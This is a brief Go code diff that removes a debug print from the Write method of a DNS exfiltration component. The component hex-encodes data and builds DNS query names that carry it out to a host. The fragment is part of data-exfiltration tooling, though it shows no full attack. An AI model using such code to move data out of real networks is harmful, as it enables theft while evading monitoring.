@@ -25,8 +25,6 @@ func newDNSExfiltrator(host string) *dnsExfiltrator {
 }
 
 func (ex *dnsExfiltrator) Write(data []byte) (int, error) {
-	fmt.Printf("DNSExfil: writing: %s\n", string(data))
-
 	payload := hex.EncodeToString(data)
 	postfix := generateMessageID() + "." + ex.host
 
